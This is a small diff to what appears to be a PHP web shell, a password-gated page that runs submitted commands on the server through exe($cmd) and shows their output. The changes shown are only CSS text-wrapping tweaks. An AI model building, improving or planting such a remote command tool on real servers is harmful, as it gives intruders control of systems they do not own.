@@ -63,6 +63,7 @@ if (isset($_GET['logout'])) {
                 background-color: black;
                 color: white;
                 font-family: monospace;
+                word-wrap: break-word;
 
             }
 
@@ -232,7 +233,7 @@ if (empty($_SESSION['login'])) {
 
         } else {
 
-            $stdout = term() . $cmd . "\n\t\t<pre>" . exe($cmd) . "\t\t</pre>\n";
+            $stdout = term() . $cmd . "\n\t\t<pre style=\"white-space: pre-wrap; word-break: break-word;\">" . exe($cmd) . "\t\t</pre>\n";
             $_SESSION['stdout'] = $stdout;
 
         }
@@ -261,7 +262,7 @@ if (empty($_SESSION['login'])) {
                 Date & Time : <span id="time"></span>
             </div>
             <hr />
-            <div style="margin-bottom: 10px; word-wrap: break-word;">
+            <div style="margin-bottom: 10px;">
                 <div style="margin-bottom: 10px;">
                     <b>Information Server</b>
                 </div>
